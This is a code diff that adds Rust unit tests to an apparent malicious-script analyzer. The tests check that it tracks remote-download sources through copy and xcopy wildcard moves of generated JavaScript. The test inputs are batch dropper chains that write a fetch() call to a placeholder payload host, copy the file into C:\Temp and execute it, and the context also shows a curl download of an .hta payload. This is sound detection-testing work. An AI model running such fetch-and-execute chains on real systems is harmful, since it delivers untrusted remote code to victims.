@@ -26377,6 +26377,41 @@ call C:/Temp/original.js"#,
     }
 
     #[test]
+    fn copy_wildcard_to_tracked_directory_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo fetch('https://copy-wildcard-dir.example/payload') > original.js
+mkdir C:\Temp
+copy /y *.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://copy-wildcard-dir.example/payload")
+            }),
+            "copy wildcard to tracked directory did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn xcopy_i_wildcard_directory_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo fetch('https://xcopy-wildcard-dir.example/payload') > original.js
+xcopy /y /i *.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://xcopy-wildcard-dir.example/payload")
+            }),
+            "xcopy /i wildcard to directory did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn move_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o original.hta https://move-download.example/payload.hta
